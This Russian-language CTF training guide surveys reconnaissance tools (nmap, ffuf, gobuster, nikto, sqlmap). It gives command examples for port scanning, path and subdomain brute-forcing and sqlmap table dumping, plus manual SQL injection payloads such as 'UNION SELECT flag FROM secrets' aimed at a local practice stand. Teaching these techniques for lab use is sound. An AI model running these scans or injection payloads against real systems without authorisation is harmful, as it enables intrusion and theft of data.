# Инструменты разведки: сеть и web 🔺

Дополнение к главам 6 и 7, уровень medium-hard. Обзор того, какие инструменты есть.

---

## 0. Карта: какой инструмент для чего

| Инструмент | Категория | Одной фразой | 
|---|---|---|---|
| **nmap** | сеть | какие хосты живы и какие порты открыты |
| **curl -I**, **whatweb** | разведка web | что за сервер и технологии | 
| **ffuf** | разведка web | перебор путей, параметров, поддоменов |
| **dirsearch**, **gobuster** | разведка web | перебор путей по словарю |
| **nikto** | сканер web | быстрый список типовых проблем сервера | 
| **sqlmap** | эксплуатация | автоматизация SQL-инъекций |
| **Burp Suite** | прокси | перехват и правка запросов |

## 1. nmap - разведка сети

Нужен, когда в задаче дали IP или хост и надо понять, что на нём работает.

```bash
nmap -sn 10.10.10.0/24          # кто живой в подсети (только пинг, без портов)
nmap 10.10.10.5                 # 1000 самых популярных портов
nmap -p- 10.10.10.5             # ВСЕ 65535 портов (дольше)
nmap -sV -sC -p 22,80,443 TGT   # версии сервисов (-sV) + базовые скрипты (-sC)
nmap -p 80 --script http-title TGT   # запустить один конкретный скрипт
```

Как читать вывод: смотри строки со `STATE` = `open`, а `SERVICE`/`VERSION` подсказывает, куда копать.
Увидел `80/http` - идёшь в разведку web; `21/ftp` - пробуешь анонимный вход; незнакомый порт -
подключаешься `nc` и смотришь, что он скажет (глава 7).

## 2. Разведка web-сервера

Первое, что делаешь с любым сайтом, - смотришь заголовки ответа:

```bash
curl -sI http://127.0.0.1:5000/          # -I = только заголовки
```

```
HTTP/1.0 200 OK
Server: nginx/1.18.0
X-Powered-By: PHP/7.4.3
```

`Server` и `X-Powered-By` выдают сервер и язык. Видишь PHP - думай о PHP-приёмах (magic hashes из
`04-crypto`, `.php.bak`); видишь Flask/Werkzeug - о SSTI (`hard.md`, п. 2). Утилита `whatweb URL`
делает то же самое автоматически и узнаёт ещё и CMS, если стоит.

## 3. Перебор путей: ffuf, dirsearch, gobuster

Идея одна: берёшь словарь имён и проверяешь, какие страницы и папки реально существуют (по коду
ответа и размеру).

```bash
# dirsearch: со встроенным словарём, -e = какие расширения пробовать
dirsearch -u http://TGT -e php,txt,bak

# gobuster: свой словарь; по умолчанию показывает всё, кроме 404
gobuster dir -u http://TGT -w words.txt

# ffuf: слово FUZZ - место, куда подставляются слова из словаря
ffuf -u http://TGT/FUZZ -w words.txt -mc 200,301,302,403         # перебор путей
ffuf -u 'http://TGT/page?FUZZ=1' -w params.txt -fs 0             # перебор имени параметра
ffuf -u http://TGT/ -H 'Host: FUZZ.target' -w subs.txt -fs 1234  # поддомены через заголовок Host
```

Главное при чтении вывода - **фильтры**, иначе утонешь в мусоре:
- `-mc` (match code) - оставить только нужные коды ответа;
- `-fs` / `-fc` (filter size / code) - выкинуть ответы такого размера или кода. Например, сайт на
  любой несуществующий поддомен отвечает одной и той же страницей в 1234 байта - `-fs 1234` её уберёт.

💡 ffuf на олимпиадной ВМ может не оказаться, но на CTF вообще это один из самых полезных инструментов.

Словари: `/usr/share/wordlists/` (если стоит пакет `dirb` или `seclists`). Обычно по умолчанию все инструменты на Kali используют его

## 4. nikto: быстрый осмотр

```bash
nikto -h http://TGT             # старый сервер, забытые файлы, странные заголовки
```

Шумный и поверхностный, но за минуту даёт список зацепок. Воспринимай как первый проход, а не
приговор: ложных срабатываний много.

---

## 5. sqlmap: автоматизация SQL-инъекций

Когда есть параметр, который, похоже, попадает в SQL-запрос (ошибка БД, странная реакция на `'`),
sqlmap сам проверит его и, если инъекция есть, вытащит данные.

```bash
sqlmap -u 'http://TGT/item?id=1' --batch                    # проверить параметр id
sqlmap -u 'http://TGT/item?id=1' --batch --dbs              # список баз
sqlmap -u 'http://TGT/item?id=1' --batch -D shop --tables   # таблицы базы shop
sqlmap -u 'http://TGT/item?id=1' --batch -D shop -T users --dump   # выгрузить таблицу

sqlmap -r request.txt --batch   # POST-запрос: сохранить его из Burp в файл и отдать целиком
```

`--batch` = на все вопросы отвечать по умолчанию. `-p id` = тестировать только параметр `id`.

⚠️ Смысл темы - **понимать инъекцию руками** (`medium.md`, п. 6.7 и `hard.md`, п. 1), а sqlmap только
ускоряет. На туре без интернета его может не быть, а понимание останется.

**Ручная проверка без sqlmap** (на стенде параметр `id` уязвим):

```bash
U=http://127.0.0.1:5000
curl -s "$U/item?id=1'"                                    # -> SQL error: ... значит параметр в SQL
curl -sG --data-urlencode "id=1 OR 1=1" $U/item            # -> pen, book, lamp: вернулись ВСЕ строки
curl -sG --data-urlencode "id=0 UNION SELECT flag FROM secrets" $U/item   # -> flag{un10n_s3l3ct_w1ns}
```

⚠️ Пробелы в адресе curl не пропустит: `curl "$U/item?id=1 OR 1=1"` упадёт с ошибкой. Либо заменяй
пробел на `%20` (`id=1%20OR%201=1`), либо делай как выше: `-G --data-urlencode` сам закодирует
значение и допишет его в адрес после `?`.

🎯 **Тренировка (разведка).** Запусти стенд и попробуй применить эти инструменты.

## 6. Чем пользоваться на туре

| Хочу... | Если есть Kali/инструменты |
|---|---|
| узнать открытые порты | `nmap -sV TGT` | 
| понять технологию сайта | `whatweb` |
| найти скрытые пути | `ffuf` / `dirsearch` | 
| проверить SQL-инъекцию | `sqlmap` |
| повторять и править запросы | Burp Repeater | 

Инструменты - это ускорители. Важно понимать как решать руками и как работают инструменты. И стоит разделять, когда быстрее и легче натравить инструмент, а когда поработать руками.
